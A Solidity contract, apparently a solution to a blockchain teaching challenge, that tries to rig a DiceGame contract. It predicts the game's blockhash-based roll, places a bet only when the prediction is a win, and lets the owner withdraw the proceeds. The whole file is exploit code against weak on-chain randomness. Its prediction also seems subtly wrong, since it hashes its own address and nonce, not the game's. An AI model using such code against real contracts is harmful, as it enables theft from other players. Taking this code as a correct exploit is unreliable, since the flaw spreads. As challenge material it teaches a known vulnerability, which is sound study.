pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;
	uint256 public nonce = 0;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

	function withdraw(address _addr, uint256 _amount) external onlyOwner {
		(bool success, ) = payable(_addr).call{ value: _amount }("");
		require(success, "Withdraw failed");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

	function riggedRoll() external payable {
		require(address(this).balance >= .002 ether);
		bytes32 previousHash = blockhash(block.number - 1);
		bytes32 hashh = keccak256(
			abi.encodePacked(previousHash, address(this), nonce)
		);
		uint256 randomNumber = uint256(hashh) % 16;
		if (randomNumber <= 5) {
			uint256 amount = 0.002 ether;
			nonce++;
			diceGame.rollTheDice{ value: amount }();
			console.logString("Winning scenario");
		} else {
			console.logString("Not a winning scenario");
			console.logUint(randomNumber);
			revert();
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
